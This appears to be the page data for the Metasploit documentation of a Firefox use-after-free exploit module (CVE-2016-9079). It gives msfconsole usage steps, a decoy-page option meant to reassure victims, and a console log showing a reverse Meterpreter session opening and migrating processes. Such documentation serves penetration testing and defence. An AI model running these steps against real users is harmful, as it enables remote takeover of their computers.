{"componentChunkName":"component---src-templates-module-documentation-template-tsx","path":"/modules/documentation/exploit/windows/browser/firefox_smil_uaf","result":{"data":{"moduleMetadataJson":{"id":"0b7b64f8-29be-5ff5-8ebe-cfdd94bffc21","name":"Firefox nsSMILTimeContainer::NotifyTimeChange() RCE","fullname":"exploit/windows/browser/firefox_smil_uaf","description":"This module exploits an out-of-bounds indexing/use-after-free condition present in\n          nsSMILTimeContainer::NotifyTimeChange() across numerous versions of Mozilla Firefox\n          on Microsoft Windows.","rank":300,"fields":{"detailsSlug":"/modules/details/exploit/windows/browser/firefox_smil_uaf","documentationSlug":"/modules/documentation/exploit/windows/browser/firefox_smil_uaf","referencesSlug":"/modules/references/exploit/windows/browser/firefox_smil_uaf"},"documentation":{"html":"<p>Mozilla Firefox is a free, open-source web browser developed and maintained by the Mozilla Foundation.  Multiple versions are affected by a use-after-free vulnerability, detailed by CVE 2016-9079, that can result in arbitrary remote code execution.</p>\n<h2 id=\"vulnerable-application\" style=\"position:relative;\"><a href=\"#vulnerable-application\" aria-label=\"vulnerable application permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>Vulnerable Application</h2>\n<p>The vulnerability is present in all releases of Mozilla Firefox prior to 50.0.2</p>\n<p>Firefox 38 through 41 were specifically chosen as targets for this module, though support for more releases is planned.</p>\n<h2 id=\"usage\" style=\"position:relative;\"><a href=\"#usage\" aria-label=\"usage permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>Usage</h2>\n<h1 id=\"useposthtml-module-option\" style=\"position:relative;\"><a href=\"#useposthtml-module-option\" aria-label=\"useposthtml module option permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>UsePostHTML module option</h1>\n<p>The module includes an option named UsePostHTML which is turned off by default.  Setting this option to true will result in the module sending an HTML page to the target to be rendered after successful exploitation.  This can be useful in convincing the target that they have arrived at a legitimate, benign website.  If desired, please edit $datadirectory/exploits/firefox<em>smil</em>uaf/post.html to suit your needs.  The included example file more than likely won't be suitable for your purposes.</p>\n<p><strong>Using firefox<em>smil</em>uaf</strong></p>\n<ol>\n<li>Start msfconsole</li>\n<li>Do: <code class=\"language-text\">use exploit/windows/browser/firefox_smil_uaf</code></li>\n<li>Do: <code class=\"language-text\">set payload [PREFERRED PAYLOAD]</code></li>\n<li>Do: <code class=\"language-text\">set PAYLOAD [PAYLOAD NAME]</code></li>\n<li>Set payload options as needed</li>\n<li>Do: <code class=\"language-text\">run</code>, and have a target browse to the generated URL</li>\n<li>Once a vulnerable target connects, you should receive a session like this:</li>\n</ol>\n<div class=\"gatsby-highlight\" data-language=\"text\"><pre style=\"counter-reset: linenumber NaN\" class=\"language-text line-numbers\"><code class=\"language-text\">[*] Exploit running as background job.\n\n[*] Started reverse TCP handler on 192.168.79.132:6789 \n[*] Using URL: http://192.168.79.132:4567/lol\n[*] Server started.\nmsf exploit(firefox_smil_uaf) &gt; [*] 192.168.79.184   firefox_smil_uaf - Got request: /lol/\n[*] 192.168.79.184   firefox_smil_uaf - From: Mozilla/5.0 (Windows NT 6.1; WOW64; rv:38.0) Gecko/20100101 Firefox/38.0\n[*] 192.168.79.184   firefox_smil_uaf - Sending exploit HTML ...\n[*] 192.168.79.184   firefox_smil_uaf - Got request: /lol/worker.js\n[*] 192.168.79.184   firefox_smil_uaf - From: Mozilla/5.0 (Windows NT 6.1; WOW64; rv:38.0) Gecko/20100101 Firefox/38.0\n[*] 192.168.79.184   firefox_smil_uaf - Sending worker thread Javascript ...\n[*] Sending stage (957487 bytes) to 192.168.79.184\n[*] Meterpreter session 1 opened (192.168.79.132:6789 -&gt; 192.168.79.184:52341) at 2017-01-20 11:25:38 -0600\n[*] Session ID 1 (192.168.79.132:6789 -&gt; 192.168.79.184:52341) processing InitialAutoRunScript &#39;migrate -f&#39;\n[*] Running module against WIN-UTRINKNPT3D\n[*] Current server process: firefox.exe (1448)\n[*] Spawning notepad.exe process to migrate to\n[+] Migrating to 2572\n[+] Successfully migrated to process 2572</code><span aria-hidden=\"true\" class=\"line-numbers-rows\" style=\"white-space: normal; width: auto; left: 0;\"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></pre></div>"}}},"pageContext":{"id":"0b7b64f8-29be-5ff5-8ebe-cfdd94bffc21"}}}